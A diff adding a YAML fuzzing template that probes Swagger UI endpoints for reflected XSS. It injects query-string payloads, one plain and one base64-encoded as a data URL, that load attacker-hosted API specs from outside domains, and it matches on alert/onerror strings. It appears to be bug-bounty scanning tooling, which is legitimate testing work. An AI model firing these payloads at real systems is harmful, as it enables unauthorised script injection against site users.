@@ -1,0 +1,41 @@
+id: swagger-xss-fuzzing
+
+info:
+  name: Swagger XSS in GET Parameters
+  author: reewardius
+  severity: medium
+  reference: https://p4n7h3rx.medium.com/how-i-got-a-2000-bounty-with-rxss-e6f45f987793
+  tags: fuzzing-xss,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      xss:
+        - "https://xss.smarpo.com/test.json"
+        - "data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ=="
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{xss}}"
+          
+    stop-at-first-match: true
+    redirects: true
+    matchers:
+      - type: word
+        words:
+          - "Swagger UI"
+          - "<img onerror=alert('textarea') src=1>"
+          - "alert(window.origin);"
+          - "swagger:"
+          - "Swagger 2.0"
+          - "\"swagger\":"
+          - "loadSwaggerUI"
+          - "**token**:"
+          - "id=\"swagger-ui"
+        condition: or
